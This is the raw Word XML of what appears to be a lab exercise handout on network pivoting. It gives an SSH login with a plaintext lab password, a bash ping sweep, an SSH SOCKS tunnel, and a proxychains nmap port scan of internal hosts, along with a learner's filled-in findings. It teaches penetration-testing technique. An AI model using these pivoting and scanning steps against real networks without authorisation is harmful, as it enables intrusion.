    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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1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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Con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>n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 xml:space="preserve">t </w:t>
      </w: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t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o the SSH Se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r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ver</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Log in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o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K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li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y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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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V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y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y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u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 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 in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 the tar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g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et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syst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m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sing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mo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’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cr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ent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ls.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ssh moo@&lt;target_IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>letmein</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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2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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Identify</w:t>
      </w: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the</w:t>
      </w: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 xml:space="preserve">SSH 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erver’s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ho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tnam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, and Inter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n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al IP Ran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>g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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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On the 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H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er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v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er,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un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co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mm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s:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="412" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="8626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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>hostname ip a route</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="2"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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ec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he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e, in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ern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l IP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s,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ubnet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k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,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fa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ult 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g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ew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y.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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3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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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an for I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>n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 xml:space="preserve">ternal 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>H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o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ts</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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From t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e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SS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 s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ss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,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 the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ollow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ng ping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weep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(o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 li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e):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="1233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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">for i in $(seq 1 20); do ip=172.31.1.$i; echo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">n "Pinging $ip... "; timeout 1 ping </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c 1 $ip &gt;/dev/null &amp;&amp; echo "UP" || echo "no response"; done</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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ec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ny li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v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 inte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l I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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f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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10260"/>
        </w:tabs>
        <w:ind w:left="2520"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-1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color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">s: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single" w:color="808080"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440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4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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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 xml:space="preserve">Create a </w:t>
      </w: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 xml:space="preserve">OCKS </w:t>
      </w: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T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un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>n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el</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3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>w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ith SSH</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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In 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ew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K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li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ermi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l, c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 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KS p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oxy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nel:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ssh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">D 1080 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">C </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">q </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>N moo@&lt;target_IP&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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Pr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ov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 m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o’s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swo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when p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mp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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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5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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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an I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>n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 xml:space="preserve">ternal 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>H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o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ts via Proxy</w:t>
      </w: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hains</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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On K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li,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un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ge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nm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p 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 v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oxy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(o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ne line):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo proxychains nmap </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">sT </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Pn -p</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>21,22,23,25,80,110,111,135,139,143,443,445,3389</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.31.1.1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>12,14</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00601D3F">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="180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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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If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ompt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,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nter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kali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’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wo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3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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>kali</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="20"/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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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ec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ny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open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or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an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ss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li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k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ely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OS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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="10420"/>
        </w:tabs>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="252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808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>172.31</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="808080"/>
          <w:position w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1.10: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
